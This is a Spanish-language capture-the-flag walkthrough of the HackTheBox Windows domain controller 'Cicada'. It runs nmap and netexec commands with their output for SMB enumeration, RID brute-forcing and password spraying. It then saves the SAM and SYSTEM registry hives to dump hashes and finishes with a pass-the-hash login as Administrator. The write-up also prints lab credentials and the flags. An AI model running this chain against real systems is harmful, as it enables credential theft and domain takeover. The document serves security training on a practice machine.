Propiedades:
- OS: Windows
- Plataforma: HackTheBox
- Nivel: Easy 
- Tags: #ad #smb #pass-the-hash #netexec #SeBackupPrivilege #hive-sam #hive-system

![](assets/Pasted%20image%2020251227064537.png)

## Reconocimiento

Tiramos un ping para comprobar la conectividad

- ttl 127 nos indica maquina windows

```bash
> ping -c 1 10.129.16.14
PING 10.129.16.14 (10.129.16.14) 56(84) bytes of data.
64 bytes from 10.129.16.14: icmp_seq=1 ttl=127 time=88.7 ms

--- 10.129.16.14 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 88.718/88.718/88.718/0.000 ms
```

Ahora realizamos un escaneo con nmap para ver que puertos tenemos abiertos

```bash
> sudo nmap -p- --open -Pn -n -sS --min-rate 5000 -v 10.129.16.14 -oG nmap/allPorts
--------------------------------------------------------------------------------------
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
49715/tcp open  unknown
```

- Puertos abiertos 53,88,135,139,389,554,464,593,636,3268,3269,5985,49715

Sobre los puertos abiertos realizo un segundo escaneo mas profundo para detectar servicios, versiones y correr un conjunto de scripts de reconocimiento.

```bash
> sudo nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,49715 -sV -sC -Pn -n -sS -v 10.129.16.14 -oA target
------------------------------------------------------------------------------------------------------------------------
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-12-27 18:05:01Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Issuer: commonName=CICADA-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-08-22T20:24:16
| Not valid after:  2025-08-22T20:24:16
| MD5:   9ec5:1a23:40ef:b5b8:3d2c:39d8:447d:db65
|_SHA-1: 2c93:6d7b:cfd8:11b9:9f71:1a5a:155d:88d3:4a52:157a
|_ssl-date: 2025-12-27T18:06:30+00:00; +6h59m59s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Issuer: commonName=CICADA-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-08-22T20:24:16
| Not valid after:  2025-08-22T20:24:16
| MD5:   9ec5:1a23:40ef:b5b8:3d2c:39d8:447d:db65
|_SHA-1: 2c93:6d7b:cfd8:11b9:9f71:1a5a:155d:88d3:4a52:157a
|_ssl-date: 2025-12-27T18:06:30+00:00; +6h59m59s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Issuer: commonName=CICADA-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-08-22T20:24:16
| Not valid after:  2025-08-22T20:24:16
| MD5:   9ec5:1a23:40ef:b5b8:3d2c:39d8:447d:db65
|_SHA-1: 2c93:6d7b:cfd8:11b9:9f71:1a5a:155d:88d3:4a52:157a
|_ssl-date: 2025-12-27T18:06:30+00:00; +6h59m59s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-12-27T18:06:30+00:00; +6h59m59s from scanner time.
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Issuer: commonName=CICADA-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-08-22T20:24:16
| Not valid after:  2025-08-22T20:24:16
| MD5:   9ec5:1a23:40ef:b5b8:3d2c:39d8:447d:db65
|_SHA-1: 2c93:6d7b:cfd8:11b9:9f71:1a5a:155d:88d3:4a52:157a
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49715/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
|_clock-skew: mean: 6h59m58s, deviation: 0s, median: 6h59m58s
| smb2-time:
|   date: 2025-12-27T18:05:53
|_  start_date: N/A
```

**A partir del escaneo de puertos, observamos información relevante sobre los servicios expuestos:**

- **Puerto 88 (Kerberos):** indica que la máquina forma parte de un dominio Active Directory.
- **Puerto 135 (RPC):** permite la enumeración de servicios y objetos del dominio.
- **Puertos 139 y 445 (SMB):** revelan el nombre del dominio `cicada.htb`.
- **Puerto 636 (LDAPS):** confirma el nombre del equipo `CICADA-DC`.
- **Puerto 5985 (WinRM):** servicio clave, ya que permite acceso remoto mediante PowerShell si se obtienen credenciales válidas.

Podemos concluir que estamos ante un `Domain Controller`.

## Enumeración y Explotación

### Servicio SMB

Saque un poco mas info de la maquina utilizando `netexec`

```bash
> nxc smb 10.129.16.14
SMB         10.129.16.14    445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
```

- Dominio `cicada.htb` 
- Nombre de la maquina `CICADA-DC`

Metí los dominios al /etc/hosts

```bash
> cat /etc/hosts
 
10.129.16.14 cicada.htb CICADA-DC
```

Enumere los recursos a los que tengo acceso como usuario `guest`.

```bash
> nxc smb 10.129.16.14 -u 'guest' -p '' --shares
SMB         10.129.16.14    445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.129.16.14    445    CICADA-DC        [+] cicada.htb\guest:
SMB         10.129.16.14    445    CICADA-DC        [*] Enumerated shares
SMB         10.129.16.14    445    CICADA-DC        Share           Permissions     Remark
SMB         10.129.16.14    445    CICADA-DC        -----           -----------     ------
SMB         10.129.16.14    445    CICADA-DC        ADMIN$                          Remote Admin
SMB         10.129.16.14    445    CICADA-DC        C$                              Default share
SMB         10.129.16.14    445    CICADA-DC        DEV
SMB         10.129.16.14    445    CICADA-DC        HR              READ
SMB         10.129.16.14    445    CICADA-DC        IPC$            READ            Remote IPC
SMB         10.129.16.14    445    CICADA-DC        NETLOGON                        Logon server share
SMB         10.129.16.14    445    CICADA-DC        SYSVOL                          Logon server share
```

- Tengo permisos de lectura en HR y IPC$ (IPC$ es un share standard de windows)

Me conecto directamente al recurso HR.

```bash
> smbclient //10.129.16.14/HR -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Mar 14 07:29:09 2024
  ..                                  D        0  Thu Mar 14 07:21:29 2024
  Notice from HR.txt                  A     1266  Wed Aug 28 12:31:48 2024

                4168447 blocks of size 4096. 482044 blocks available
smb: \> get "Notice from HR.txt"
getting file \Notice from HR.txt of size 1266 as Notice from HR.txt (3.5 KiloBytes/sec) (average 3.5 KiloBytes/sec)
```

- Encuentro un archivo **"Notice from HR.txt"** el cual descargo en mi maquina.

Inspecciono el archivo para ver que contiene y veo una credencial `Cicada$M6Corpb*@Lp#nZp!8`

```bash
> cat 'Notice from HR.txt'

Dear new hire!

Welcome to Cicada Corp! We're thrilled to have you join our team. As part of our security protocols, it's essential that you change your default password to something unique and secure.

Your default password is: Cicada$M6Corpb*@Lp#nZp!8

To change your password:

1. Log in to your Cicada Corp account** using the provided username and the default password mentioned above.
2. Once logged in, navigate to your account settings or profile settings section.
3. Look for the option to change your password. This will be labeled as "Change Password".
4. Follow the prompts to create a new password**. Make sure your new password is strong, containing a mix of uppercase letters, lowercase letters, numbers, and special characters.
5. After changing your password, make sure to save your changes.

Remember, your password is a crucial aspect of keeping your account secure. Please do not share your password with anyone, and ensure you use a complex password.

If you encounter any issues or need assistance with changing your password, don't hesitate to reach out to our support team at support@cicada.htb.

Thank you for your attention to this matter, and once again, welcome to the Cicada Corp team!

Best regards,
Cicada Corp
```

Ahora voy a tratar de enumera usuarios mediante `RID brute-force` 

```bash
> nxc smb 10.129.16.14 -u 'guest' -p '' --rid-brute | grep "SidTypeUser"
SMB                      10.129.16.14    445    CICADA-DC        500: CICADA\Administrator (SidTypeUser)
SMB                      10.129.16.14    445    CICADA-DC        501: CICADA\Guest (SidTypeUser)
SMB                      10.129.16.14    445    CICADA-DC        502: CICADA\krbtgt (SidTypeUser)
SMB                      10.129.16.14    445    CICADA-DC        1000: CICADA\CICADA-DC$ (SidTypeUser)
SMB                      10.129.16.14    445    CICADA-DC        1104: CICADA\john.smoulder (SidTypeUser)
SMB                      10.129.16.14    445    CICADA-DC        1105: CICADA\sarah.dantelia (SidTypeUser)
SMB                      10.129.16.14    445    CICADA-DC        1106: CICADA\michael.wrightson (SidTypeUser)
SMB                      10.129.16.14    445    CICADA-DC        1108: CICADA\david.orelious (SidTypeUser)
SMB                      10.129.16.14    445    CICADA-DC        1601: CICADA\emily.oscars (SidTypeUser)
```

Todos estos usuarios los voy a meter en una lista para probarlos con la contraseña anteriormente encontrada.

```bash
> cat users.txt
Administrator
Guest
krbtgt
CICADA-DC$
john.smoulder
sarah.dantelia
michael.wrightson
david.orelious
emily.oscars
```

**Password Spraying.**

Ahora voy a realizar un `Password Spraying` utilizando `netexec`

- El Password Spraying consiste en utilizar una sola contraseña para múltiples usuarios.

```bash
> nxc smb 10.129.16.14 -u users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8'
SMB         10.129.16.14    445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.129.16.14    445    CICADA-DC        [-] cicada.htb\Administrator:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE
SMB         10.129.16.14    445    CICADA-DC        [-] cicada.htb\Guest:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE
SMB         10.129.16.14    445    CICADA-DC        [-] cicada.htb\krbtgt:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE
SMB         10.129.16.14    445    CICADA-DC        [-] cicada.htb\CICADA-DC$:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE
SMB         10.129.16.14    445    CICADA-DC        [-] cicada.htb\john.smoulder:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE
SMB         10.129.16.14    445    CICADA-DC        [-] cicada.htb\sarah.dantelia:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE
SMB         10.129.16.14    445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8
```

- Encuentro un usuario valido `michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8`

#### usuario michael.wrightson

Ahora que tengo un usuario valido puedo tratar de ver si pertenece al grupo `Remote Managment Users` para poder acceder por `Win-Rm`.

- Sin exito

```bash
> nxc winrm 10.129.16.14 -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8'

WINRM       10.129.16.14    5985   CICADA-DC        [*] Windows Server 2022 Build 20348 (name:CICADA-DC) (domain:cicada.htb)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.129.16.14    5985   CICADA-DC        [-] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8
```

Ya que no tengo acceso por `WinRm` puedo seguir enumerando el SMB pero como el usuario `michael`.

- Tampoco vemos nada nuevo.

```bash
> nxc smb 10.129.16.14 -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' --shares
SMB         10.129.16.14    445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.129.16.14    445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8
SMB         10.129.16.14    445    CICADA-DC        [*] Enumerated shares
SMB         10.129.16.14    445    CICADA-DC        Share           Permissions     Remark
SMB         10.129.16.14    445    CICADA-DC        -----           -----------     ------
SMB         10.129.16.14    445    CICADA-DC        ADMIN$                          Remote Admin
SMB         10.129.16.14    445    CICADA-DC        C$                              Default share
SMB         10.129.16.14    445    CICADA-DC        DEV
SMB         10.129.16.14    445    CICADA-DC        HR              READ
SMB         10.129.16.14    445    CICADA-DC        IPC$            READ            Remote IPC
SMB         10.129.16.14    445    CICADA-DC        NETLOGON        READ            Logon server share
SMB         10.129.16.14    445    CICADA-DC        SYSVOL          READ            Logon server share
```

Por lo cual ahora voy a tratar de conectarme con `rpcclient` para ver si puedo enumerar informacion de los usuarios.

- `querydispinfo` para ver la descripción de los usuarios.

 ```bash
> rpcclient -U michael.wrightson 10.129.16.14

rpcclient $> querydispinfo
index: 0xeda RID: 0x1f4 acb: 0x00000210 Account: Administrator  Name: (null)    Desc: Built-in account for administering the computer/domain
index: 0xfeb RID: 0x454 acb: 0x00000210 Account: david.orelious Name: (null)    Desc: Just in case I forget my password is aRt$Lp#7t*VQ!3
index: 0x101d RID: 0x641 acb: 0x00000210 Account: emily.oscars  Name: Emily Oscars      Desc: (null)
index: 0xedb RID: 0x1f5 acb: 0x00000214 Account: Guest  Name: (null)    Desc: Built-in account for guest access to the computer/domain
index: 0xfe7 RID: 0x450 acb: 0x00000210 Account: john.smoulder  Name: (null)    Desc: (null)
index: 0xf10 RID: 0x1f6 acb: 0x00020011 Account: krbtgt Name: (null)    Desc: Key Distribution Center Service Account
index: 0xfe9 RID: 0x452 acb: 0x00000210 Account: michael.wrightson      Name: (null)    Desc: (null)
index: 0xfe8 RID: 0x451 acb: 0x00000210 Account: sarah.dantelia Name: (null)    Desc: (nu
```

- El usuario `david.orelious` tiene en su descripción su contraseña `aRt$Lp#7t*VQ!3`

#### usuario david.orelious

Ahora enumeramos los shares a los que david tiene acceso.

```bash
> nxc smb 10.129.16.14 -u david.orelious -p 'aRt$Lp#7t*VQ!3' --shares
SMB         10.129.16.14    445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.129.16.14    445    CICADA-DC        [+] cicada.htb\david.orelious:aRt$Lp#7t*VQ!3
SMB         10.129.16.14    445    CICADA-DC        [*] Enumerated shares
SMB         10.129.16.14    445    CICADA-DC        Share           Permissions     Remark
SMB         10.129.16.14    445    CICADA-DC        -----           -----------     ------
SMB         10.129.16.14    445    CICADA-DC        ADMIN$                          Remote Admin
SMB         10.129.16.14    445    CICADA-DC        C$                              Default share
SMB         10.129.16.14    445    CICADA-DC        DEV             READ
SMB         10.129.16.14    445    CICADA-DC        HR              READ
SMB         10.129.16.14    445    CICADA-DC        IPC$            READ            Remote IPC
SMB         10.129.16.14    445    CICADA-DC        NETLOGON        READ            Logon server share
SMB         10.129.16.14    445    CICADA-DC        SYSVOL          READ            Logon server share
```

- Vemos un nuevo recurso DEV en el que tenemos permisos de lectura.

Con `smbmap` puedo hacer una búsqueda recursiva en todos los shares

```bash
> smbmap -H 10.129.16.14 -u david.orelious -p 'aRt$Lp#7t*VQ!3' -r

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB
[*] Established 1 SMB connections(s) and 1 authenticated session(s)

[+] IP: 10.129.16.14:445        Name: cicada.htb                Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        DEV                                                     READ ONLY
        ./DEV
        dr--r--r--                0 Wed Aug 28 12:27:31 2024    .
        dr--r--r--                0 Thu Mar 14 07:21:29 2024    ..
        fr--r--r--              601 Wed Aug 28 12:28:22 2024    Backup_script.ps1
        HR                                                      READ ONLY
```

- En el recurso `DEV` encontramos un archivo llamado `Backup_script.ps1`

Me conecto y descargo el archivo `Backup_script.ps1`

```bash
> smbclient //10.129.16.14/DEV -U david.orelious

Password for [WORKGROUP\david.orelious]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Mar 14 07:31:39 2024
  ..                                  D        0  Thu Mar 14 07:21:29 2024
  Backup_script.ps1                   A      601  Wed Aug 28 12:28:22 2024
g
                4168447 blocks of size 4096. 478507 blocks available
smb: \> get Backup_script.ps1
getting file \Backup_script.ps1 of size 601 as Backup_script.ps1 (1.7 KiloBytes/sec) (average 1.7 KiloBytes/sec)
```

Inspecciono el script para ver que contiene

```powershell
> cat Backup_script.ps1

$sourceDirectory = "C:\smb"
$destinationDirectory = "D:\Backup"

$username = "emily.oscars"
$password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force
$credentials = New-Object System.Management.Automation.PSCredential($username, $password)
$dateStamp = Get-Date -Format "yyyyMMdd_HHmmss"
$backupFileName = "smb_backup_$dateStamp.zip"
$backupFilePath = Join-Path -Path $destinationDirectory -ChildPath $backupFileName
Compress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath
Write-Host "Backup completed successfully. Backup file saved to: $backupFilePath"
```

- Vemos que el script muestra las credenciales `emily.oscars:Q!3@Lp#M6b*7t*Vt`

#### usuario emily.oscars

Ahora podemos volver a tratar de ver si tenemos acceso por `winrm` con el usuario emily.

```bash
> nxc winrm 10.129.16.14 -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'
WINRM       10.129.16.14    5985   CICADA-DC        [*] Windows Server 2022 Build 20348 (name:CICADA-DC) (domain:cicada.htb)
WINRM       10.129.16.14    5985   CICADA-DC        [+] cicada.htb\emily.oscars:Q!3@Lp#M6b*7t*Vt (Pwn3d!)
```

- `emily.oscars:Q!3@Lp#M6b*7t*Vt (Pwn3d!)` indica que somos en efecto tenemos acceso via winrm


Accedo via WinRm con el usuario emily.oscars

```powershell
> evil-winrm -i 10.129.16.14 -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc'' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> whoami
cicada\emily.oscars
```

## Escalada de Privilegios

Dentro del sistema verifique los privilegios de mi usuario `emily`

- Al parecer tengo el privilegio `SeBackupPrivilege` que sirve para crear Backups.

```powershell
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

Enumere la Informacion del Usuario emily

- Pertenezco al grupo `Backup Operators` que basicamente me permite crear Backups de cualquier archivo sin importar los permisos de este. Podemos leer mas de este grupo en [Microsoft Docs](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#backup-operators)

```powershell
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> net user emily.oscars
User name                    emily.oscars
Full Name                    Emily Oscars
Comment
User's comment'
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            8/22/2024 1:20:17 PM
Password expires             Never
Password changeable          8/23/2024 1:20:17 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   Never

Logon hours allowed          All

Local Group Memberships      *Backup Operators     *Remote Management Use
Global Group memberships     *Domain Users
The command completed successfully.
```

**Abusando del privilegio `SeBackupPrivilege` para crear copias de seguridad de los hives SAM y SYSTEM**

- **SAM** es un archivo del sistema que almacena los hashes de las contraseñas de las cuentas locales de la máquina. Este archivo se encuentra cifrado y su contenido solo puede descifrarse utilizando la _boot key_, la cual se obtiene del hive **SYSTEM**.
- **SYSTEM** contiene la _boot key_ del sistema, necesaria para descifrar la información almacenada en el hive **SAM**.

```powershell
*Evil-WinRM* PS C:\> cd temp
*Evil-WinRM* PS C:\temp> reg save hklm\sam C:\temp\sam.hive
The operation completed successfully.

*Evil-WinRM* PS C:\temp> reg save hklm\system C:\temp\system.hive
The operation completed successfully.
```

Nos descargaremos en nuestra maquina los archivos.

```powershell
*Evil-WinRM* PS C:\temp> download sam.hive

Info: Downloading C:\temp\sam.hive to sam.hive

Info: Download successful!
*Evil-WinRM* PS C:\temp> download system.hive

Info: Downloading C:\temp\system.hive to system.hive

Info: Download successful!
```

Con la herramienta `impacket-seecretsdump` podemos extraer los hashes con de los archivos.

```bash
impacket-secretsdump -sam sam.hive -system system.hive LOCAL
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Target system bootKey: 0x3c2b033757a49110a9ee680b46e8d620
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Cleaning up...
```

- Hash del administrador: `Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::`

Con el Hash del usuario Administrator podemos realizar un ataque Pass The Hash que basicamente consiste en utilizar el hash como contraseña.

- **Pass-the-Hash funciona porque NTLM usa un mecanismo de desafío-respuesta:** el servidor envía un valor aleatorio (challenge de 8 bytes), el cliente lo cifra con su hash NT y lo devuelve. El servidor hace lo mismo con el hash almacenado, y si coinciden, autentica al usuario. La vulnerabilidad es que el cliente nunca necesita la contraseña original, solo el hash NT, por lo que un atacante con acceso al hash puede autenticarse directamente sin conocer la contraseña real.

```powershell
> evil-winrm -i 10.129.16.14 -u administrator -H '2b87e7c93a3e8a0ea4a581937016f341'

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
*Evil-WinRM* PS C:\Users\Administrator> whoami
cicada\administrator
```

Flags

```bash
#user 
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> cat user.txt
7f9267f444609f5af12cd01946e7fe3c

# root
*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
9b50c155c39adeebe47bdecf4b726b4b

```

***PWNED***

![](assets/Pasted%20image%2020251227061000.png)